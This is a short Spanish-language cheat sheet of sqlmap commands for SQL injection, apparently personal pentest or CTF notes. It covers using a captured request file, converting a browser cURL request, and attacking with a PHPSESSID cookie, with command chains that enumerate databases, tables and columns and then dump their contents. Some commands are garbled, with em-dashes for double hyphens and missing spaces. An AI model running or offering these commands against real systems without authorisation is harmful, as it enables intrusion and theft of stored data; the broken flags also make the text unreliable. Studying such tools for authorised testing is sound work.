## SQLInjection con petición interceptada:

```bash
sqlmap -r request.txt —dbs —batch

sqlmap -u URL/login.php --batch -D TABLA_ELEGIDA--threads 10 --tables —forms

sqlmap -u URL/login.php --batch -D TABLA_ELEGIDA  -T NUEVA_TABLA --threads 10 --columns

sqlmap -u URL/login.php--batch -D TABLA_ELEGIDA  -T NUEVA_TABLA -C <columnas>--dump
```

## SQLInjection en formato cURL:

Abrir herramientas de desarrollador, network, click derecho en la petición y copiar en cURL.

En la terminal sustituir curl por sqlmap -u, agregar * en test 

Agregar despues de Accept encoding (si no existen):

```bash
-H ‘DNT: 1’ \

-H ‘Sec-GPC: 1’ \

En Priority agregar:

—batch —dbs —level=1 —risk=1 —technique=U
```

Se explora con los mismos comandos de sqlmap entre —batch y —level

## SQLInjection con PHPSESSID:

```bash
sqlmap -u "URL" --data="PARAMETRO=" -p PARAMETRO --cookie="PHPSESSID=" --dbs --batch --keep-alive
```
